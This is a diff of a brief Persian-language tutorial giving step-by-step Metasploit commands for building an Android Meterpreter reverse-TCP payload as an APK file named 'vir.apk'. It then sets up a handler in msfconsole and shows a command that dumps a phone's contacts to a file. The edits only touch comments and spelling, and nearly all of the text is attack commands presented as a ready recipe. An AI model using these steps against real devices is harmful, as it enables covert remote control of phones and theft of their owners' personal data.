@@ -4,7 +4,7 @@
   
 1) msfvenom -p android/meterpreter/reverse_tcp LHOST=* LPORT=** -o /home/kali/Desktop/vir.apk
 
-* = ifconfig      **=دلخواه
+{{{{ * = ifconfig      **= پورت دلخواه }}}}
 
 2) msfconsole
 
@@ -24,14 +24,15 @@
 7) set LPORT **
 
 
-8) options   مجدد options رو بزنیم میبینیم که دو مورد بالا ست شدن
+8) options   رو بزنیم میبینیم که دو مورد بالا ست شدن options مجدد
 
 
 9) exploit
 
 
-10) help
+10) help  راهنمای اسکریپت باز می شود
 
 
-examplae : برای مخاطبین : dump_contacts -o /home/kali/Desktop/contact.txt
+---------------------------------------------------------------------------
+example : برای مخاطبین : dump_contacts -o /home/kali/Desktop/contact.txt
 
